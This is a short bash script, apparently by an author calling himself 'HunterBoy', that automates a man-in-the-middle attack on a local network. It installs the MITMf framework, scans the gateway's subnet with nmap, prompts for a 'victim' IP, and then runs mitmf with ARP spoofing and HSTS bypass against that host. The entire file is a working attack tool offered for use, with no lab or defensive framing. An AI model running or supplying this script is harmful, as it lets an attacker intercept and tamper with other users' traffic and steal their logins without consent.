#!/bin/bash

echo "This script is written by HunterBoy"
echo "Please Make Sure You don't temper with the script"



echo "Installing MITM FrameWork and Other Required Packegs"
printf " \n"
sudo apt-get install mitmf &&  printf " \n"

echo "If Error Please Try using : 
sudo apt-get update && sudo  apt-get upgrade "
echo "Fetching IP and Gateways "

export ip=$(hostname -I)
echo Your IP is : 	  $ip
printf " \n"
export gway=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
printf " \n"
echo  Your Gateway IP is  $gway 
export inf=$(ip r show|grep " src "|cut -d " " -f 3,12)
printf " \n   "
echo Your active Interface is : $inf
echo "Scanning the Network for Victim IP"

nmap -sV $gway/24
printf " \n   "
read -p "Please Enter the Victim IP : " victimIp
printf " \n"

echo 	"Now sit Back and Relax "
echo   "HunterBoy is Here for you"

printf " \n"  

mitmf -i wlan0 --target "$victimIp"  --gateway "$gway" --arp --spoof --hsts
